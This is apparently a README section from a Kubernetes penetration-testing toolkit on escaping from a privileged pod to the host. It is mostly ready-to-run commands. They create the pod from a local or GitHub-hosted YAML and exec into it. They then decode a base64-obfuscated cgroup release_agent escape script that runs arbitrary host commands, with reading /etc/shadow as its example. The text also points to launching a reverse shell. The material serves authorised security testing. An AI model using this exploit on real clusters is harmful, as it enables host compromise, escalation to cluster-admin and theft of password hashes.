## You can create a pod with only privileged: true

If you only have `privileged=true`, you can still get RCE on the host, and ultimately cluster-admin, but the path is more tedious. The exploit below escapes the container and allows you to run one command at a time. From there, you can launch a reverse shell.  

[pod-priv-only.yaml](pod-priv-only.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-priv-only.yaml   
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/priv-only/pod-priv-only.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-priv-only -- bash
```

### Post exploitation
```bash
# Create undock script that will automate the container escape POC
echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
# Then use the script to run whatever commands you want on the host: 
sh undock.sh "cat /etc/shadow"
```

Reference(s): 
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 

